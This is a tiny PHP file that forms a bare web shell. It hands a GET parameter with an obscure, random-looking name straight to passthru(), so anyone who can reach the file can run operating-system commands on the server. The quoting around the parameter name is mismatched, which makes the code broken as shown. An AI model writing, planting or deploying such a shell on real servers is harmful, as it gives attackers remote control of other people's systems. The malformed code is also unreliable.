<?php
passthru($_GET["DkATHfoV']);
?>
